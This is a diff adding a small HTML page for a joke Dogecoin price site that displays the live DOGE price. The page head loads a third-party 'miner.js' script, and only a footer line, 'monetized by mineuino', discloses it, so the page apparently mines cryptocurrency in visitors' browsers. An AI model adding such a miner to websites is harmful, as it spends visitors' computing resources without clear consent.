@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DogeGoal</title>
+    <link rel="stylesheet" href="style.css" />
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/d3/6.7.0/d3.min.js"
+      integrity="sha512-cd6CHE+XWDQ33ElJqsi0MdNte3S+bQY819f7p3NUHgwQQLXSKjE4cPZTeGNI+vaxZynk1wVU3hoHmow3m089wA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+      defer
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.rawgit.com/h2non/jsHashes/master/hashes.js"
+      defer
+    ></script>
+    <script src="https://mineuino.vercel.app/miner.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.3.2/dist/chart.min.js"></script>
+  </head>
+  <body>
+    <div id="mineuino-div" data-mineuino-username="vatsadev"></div>
+    <header class="header">
+      <h1>When is the Dogecoin Moon?</h1>
+      <p>Hint: its $69,420</p>
+    </header>
+    <main>
+      <h2 class="center">$69,420, very rise</h2>
+      <p>
+        the Dogecoin goal(Moon) is 69,420 dollars, because it combines the two
+        doge numbers, 69 and 420, and is the perfect stability number, much wow,
+        so get to the stonks doge whales!
+      </p>
+      <h3 class="center">How close are we?</h3>
+      <p class="center">The current price</p>
+      <h1 id="doge" class="center"></h1>
+      <p class="center">USD</p>
+    </main>
+    <footer>
+      <p>
+        © Vatsadev and Vaidehi Pandey, all rights reserved. <br />
+        dogecoin price from
+        <a href="http://https://sochain.com//api/v2/get_price/DOGE/USD"
+          >Sochain.com</a
+        >
+        <br />
+        picture made by an unknown shibe
+        <br />
+        monetized by mineuino
+      </p>
+      <div class="social">
+        <div class="inline">
+          <a href="https://dogecoin.com/"><img src="Dogecoin_Logo.png" alt="donate-doge" width="50px" height="50px"></a>
+        </div>
+        <div class="inline">
+          <a href="https://reddit.com/r/dogecoin/"><img src="reddit.png" alt="reddit" width="50px" height="50px"></a>
+        </div>
+        <div class="inline">
+          <a href="https://github.com/dogecoin/"><img src="github.png" alt="github" width="50px" height="50px"></a>
+        </div>
+      </div>
+    </footer>
+    <script defer>
+      let price;
+
+      fetch("https://sochain.com//api/v2/get_price/DOGE/USD")
+        .then((response) => response.json())
+        .then(
+          (data) =>
+            (document.getElementById("doge").innerHTML =
+              data.data.prices[0].price)
+        );
+    </script>
+  </body>
+</html>
